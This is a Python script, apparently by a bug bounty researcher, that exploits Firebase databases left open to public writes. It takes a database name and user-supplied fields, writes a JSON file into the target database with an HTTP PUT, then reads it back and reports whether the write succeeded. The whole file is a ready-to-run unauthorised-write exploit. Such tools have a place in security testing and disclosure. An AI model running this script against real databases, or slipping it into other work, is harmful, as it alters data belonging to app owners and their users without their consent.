# Author:
'''
Muhammad Khizer Javed
Cyber Security Researcher & Bug Bounty Hunter
whoami.securitybreached.org
Updated: 06-02-2021
'''
import requests
import urllib.request, urllib.parse, urllib.error
print("""
<============================================================================================================>
||                               \"Firebase Database Permissions Exploit                                     ||
||  Usage   : Provide target DB name, filename to be create, information to write                           ||
||  Blog    : Read Full Blog about                                                                          ||
||  Url     : https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty  ||
||  Info    : This is A simple Python Exploit to Write Data to Insecure/vulnerable firebase databases!      ||
||            Commonly found inside Mobile Apps.                                                            ||
||            If the owner of the app have set the security rules as true for both "read" & "write"         ||
||            an attacker can probably dump database and write his own data to firebase database.           ||
<============================================================================================================>
""")

#Give Data
print ("[>] Input Data for exploit\n")
site = input("[+] Enter firebase Database Name : ")
file = input("[+] Enter filename    : ")
name = input("[+] Enter name        : ")
email= input("[+] Enter email       : ")
website = input("[+] Enter Website     : ")
message = input("[+] Enter A Message   : ")

#Payload
site_url = "https://"+site+".firebaseio.com/"+file+".json"

data = {"Exploit": "Successfull", "website": website, "email": email, "name": name, "message": message}

response = requests.put(site_url,json=data)

#Collecting file
print("""
<<======================================================================>>
""")
if response.status_code == 200:
    print ("[*] Exploited\n")
    print(("File Created: https://"+site+".firebaseio.com/"+file+".json\n"))
else:
    print ("[*] Not Exploited\n")
    print ("No File Created")
print("""
<<======================================================================>>
""")
print("""If you get a response 'Permission Denied' with 'Successfully
Exploited' This shows Exploit is written but can't be read.
Verify by visiting the URL""")
print(" ")
print("[>] Response\n")
r = requests.get("https://"+site+".firebaseio.com/"+file+".json")
print(r.text)
print("""
<<======================================================================>>
""")
#Reasoning
if response.status_code == 200:
 print ("[>>] Successfully Exploited")
elif response.status_code == 401:
 print ("[x] Not Exploitable \n[!] Reason: All Permissions Denied")
elif response.status_code == 404:
 print ("[x] Database Not Found \n[!] Reason: Firebase Database Not Found")
else:
 print ("[x] Unknown Error \n[!] Reason: Unknown Error\n")

print("" "")
